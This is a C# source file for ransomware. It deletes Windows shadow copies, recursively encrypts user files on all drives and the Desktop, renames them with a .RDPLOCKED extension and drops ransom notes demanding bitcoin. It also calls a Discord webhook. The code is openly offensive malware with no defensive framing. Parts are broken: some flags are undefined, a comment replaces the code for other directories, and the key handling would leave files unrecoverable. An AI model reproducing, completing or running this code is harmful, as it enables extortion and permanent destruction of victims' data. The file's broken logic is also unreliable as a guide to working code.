using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Services.ZagreuS
{
    public class Ransomware
    {
        public static string username = Environment.UserName;
        public static string computerName = Environment.MachineName;
        public static string driveRoot = "C:\\";
        public static string usersPath = "Users\\";
        public static byte[] passwordSalt = Encoding.ASCII.GetBytes("o6806642kbM7c5");
        public static int keyDerivationIterations = 2000;
        public static int keySize = 256;
        public static int blockSize = 128;
        public static int byteSize = 8;

        public static string desktopPath = Path.Combine(driveRoot, usersPath, username, "Desktop");
        public static string bitcoinWallet = "js97xc025fwviwhdg53gla97xc025fwv";
        public static string contactEmail = "rlocked@protonmail.com";
        public static string ransomAmount = "980";
        public static string discordWebhook = "https://discord.com/api/webhooks/1327963875894759434/IqV04atSt4E91XOi4LoWQT-8LRYulg5rPqsfKHjtkpIfknpY_AsFbDtDrkyfHIUSPpmY";
        public static string encryptedExtension = ".RDPLOCKED";
        public static string targetExtensions = ".txt.doc.docx.mp3.xls.xlsx.ppt.sql.wmv.mp4.mp3.dll.jar.pptx.odt.jpg.tar.gz.bmp.pbm.rtf.png.csv.sql.mdb.sln.php.avi.mov.flv.amv.mpv.mtv.asp.aspx.html.xml.psd.pdf.exe.rv.rvx.ved.wm.wmv.TXT.JPG.rar.xwmv.wma.midi.fla.pdf.wma.ico.gif.GIF.ogg.mpg.icns.RAR.png.zip.BAT.Exe.c.exe.PNG.7z.exe.EXE.sql.mp4.7z.rar.m4a.wma.avi.wmv.csv.d3dbsp.zip.sie.sum.ibank.t13.t12.qdf.gdb.tax.pkpass.bc6.bc7.bkp.qic.bkf.sidn.sidd.mddata.itl.itdb.icxs.hvpl.hplg.hkdb.mdbackup.syncdb.gho.cas.svg.map.wmo.itm.sb.fos.mov.vdf.ztmp.sis.sid.ncf.menu.layout.dmp.blob.esm.vcf.vtf.dazip.fpk.mlx.kf.iwd.vpk.tor.psk.rim.w3x.fsh.ntl.arch00.lvl.snx.cfr.ff.vpp_pc.lrf.m2.mcmeta.vfs0.mpqge.kdb.db0.dba.rofl.hkx.bar.upk.das.iwi.litemod.asset.forge.ltx.bsa.apk.re4.sav.lbf.slm.bik.epk.rgss3a.pak.bigwallet.wotreplay.xxx.desc.py.m3u.flv.js.css.rb.png.jpeg.txt.p7c.p7b.p12.pfx.pem.crt.cer.der.x3f.srw.pef.ptx.r3d.rw2.rwl.raw.raf.orf.nrw.mrw.ref.mef.erf.kdc.dcr.cr2.crw.cerber.WNCRY.dsewrbg.bay.sr2.srf.arw.3fr.dng.jpe.jpg.cdr.indd.ai.eps.pdf.pdd.psd.dbf.mdf.wb2.rtf.wpd.dxg.xf.dwg.pst.vbs.accdb.mdb.pptm.pptx.ppt.xlk.xlsb.xlsm.xlsx.xls.wps.docm.docx.doc.odb.odc.odm.odp.ods.odt";
        public static string publicKey = "BgIAAACkAABSU0ExAAQAAAEAAQDNCvFC6znsbOFkYq1zKsddbdYpsBTRG15J1i+Fv7bbfpxSg+jcPPfCTDhS0lBIbZVQym7TBBoHX5kbrwG1dsFk4TcFUgkiNMO1YmSPHLtzbNDOxZjFQXouk2VHCbwmuu5U7V3Vf+iFwtc7Tp2eEIFm1Mt0gx2TxwYe5Erkzyh+3w==";
        public static string randomString = GenerateRandomString(30);
        public static string encryptedKey;

        [STAThread]
        public static void Main()
        {
            try
            {
                EnableUAC(); // Modify registry to enable UAC
                DeleteShadowCopies(); // Delete volume shadow copies
                EncryptFiles(); // Encrypt files in specified directories
                DeleteShadowCopies(); // Ensure shadow copies are deleted
                NotifyViaDiscord(); // Send notification to Discord webhook
            }
            catch (Exception ex)
            {
                MessageBox.Show("ERROR");
            }
        }

        public static void EncryptFiles()
        {
            encryptedKey = Convert.ToBase64String(EncryptRSA(contactEmail, GenerateRandomString(30)));

            if (encryptLogicalDrives == "True")
            {
                foreach (string drive in Directory.GetLogicalDrives())
                {
                    if (drive != "C:\\")
                    {
                        EncryptDirectory(drive, randomString);
                        CreateRansomNote(drive);
                    }
                }
            }

            // Encrypt specific directories if their flags are set to "True"
            if (encryptDesktop == "True") { EncryptDirectory(desktopPath, randomString); CreateRansomNote(desktopPath); }
            // Similar checks for other directories (Links, Contacts, Documents, etc.)
        }

        public static byte[] EncryptAES(byte[] data, byte[] key)
        {
            using (var ms = new MemoryStream())
            using (var aes = new RijndaelManaged())
            {
                aes.KeySize = keySize;
                aes.BlockSize = blockSize;
                var derive = new Rfc2898DeriveBytes(key, passwordSalt, keyDerivationIterations);
                aes.Key = derive.GetBytes(keySize / byteSize);
                aes.IV = derive.GetBytes(blockSize / byteSize);
                aes.Mode = CipherMode.CBC;

                using (var cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(data, 0, data.Length);
                    cs.Close();
                }
                return ms.ToArray();
            }
        }

        public static void EncryptFile(string filePath, string key)
        {
            byte[] fileData = File.ReadAllBytes(filePath);
            byte[] keyBytes = Encoding.UTF8.GetBytes(key);
            keyBytes = SHA256.Create().ComputeHash(keyBytes);
            byte[] encryptedData = EncryptAES(fileData, keyBytes);
            File.WriteAllBytes(filePath, encryptedData);
            File.Move(filePath, filePath + encryptedExtension);
        }

        public static RSACryptoServiceProvider LoadPublicKey(string key)
        {
            var rsa = new RSACryptoServiceProvider();
            byte[] keyBlob = Convert.FromBase64String(key);
            rsa.ImportCspBlob(keyBlob);
            return rsa;
        }

        public static byte[] EncryptRSA(string data, string key)
        {
            using (var rsa = LoadPublicKey(publicKey))
            {
                return rsa.Encrypt(Encoding.UTF8.GetBytes(key), false);
            }
        }

        public static void EncryptDirectory(string path, string key)
        {
            try
            {
                string[] files = Directory.GetFiles(path);
                string[] directories = Directory.GetDirectories(path);

                foreach (string file in files)
                {
                    string extension = Path.GetExtension(file);
                    if (targetExtensions.Contains(extension))
                    {
                        EncryptFile(file, key);
                    }
                }

                foreach (string dir in directories)
                {
                    EncryptDirectory(dir, key);
                    CreateRansomNote(dir);
                }
            }
            catch (Exception ex)
            {
                // Swallow exceptions to continue encryption
            }
        }

        public static void EnableUAC()
        {
            try
            {
                var processInfo = new ProcessStartInfo("cmd.exe")
                {
                    Arguments = "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = false,
                    UseShellExecute = true,
                    Verb = "runas"
                };
                Process.Start(processInfo);
            }
            catch (Exception) { }
        }

        public static void DeleteShadowCopies()
        {
            try
            {
                var processInfo = new ProcessStartInfo("cmd.exe", "/c vssadmin.exe delete shadows /all /quiet")
                {
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process.Start(processInfo);
            }
            catch (Exception) { }
        }

        public static void NotifyViaDiscord()
        {
            try
            {
                Process.Start(discordWebhook);
            }
            catch (Exception) { }
        }

        public static void CreateRansomNote(string path)
        {
            string[] ransomNote = {
                $"Oops All Of your important files were encrypted Like document pictures videos etc..\r\n" +
                $"Don't worry, you can return all your files!\r\n" +
                $"All your files, documents, photos, databases and other important files are encrypted by a strong encryption.\r\n" +
                $"How to recover files?\r\n" +
                $"RSA is a asymmetric cryptographic algorithm, you need one key for encryption and one key for decryption so you need private key to recover your files. It’s not possible to recover your files without private key.\r\n" +
                $"The only method of recovering files is to purchase an unique private key. Only we can give you this key and only we can recover your files.\r\n" +
                $"What guarantees you have?\r\n" +
                $"As evidence, you can send us 1 file to decrypt by email We will send you a recovery file Prove that we can decrypt your file\r\n" +
                $"Please You must follow these steps carefully to decrypt your files:\r\n" +
                $"Send ${ransomAmount} worth of bitcoin to wallet: {bitcoinWallet}\r\n" +
                $"after payment, we will send you Decryptor software\r\n" +
                $"contact email: {contactEmail}\r\n" +
                $"Your personal ID: {encryptedKey}"
            };
            File.WriteAllLines(Path.Combine(path, "HELP_DECRYPT_YOUR_FILES.txt"), ransomNote);
        }

        public static string GenerateRandomString(int length)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            byte[] randomBytes = new byte[length];
            using (var rng = new RNGCryptoServiceProvider())
            {
                rng.GetNonZeroBytes(randomBytes);
            }
            var result = new StringBuilder(length);
            foreach (byte b in randomBytes)
            {
                result.Append(chars[b % chars.Length]);
            }
            return result.ToString();
        }
    }
}
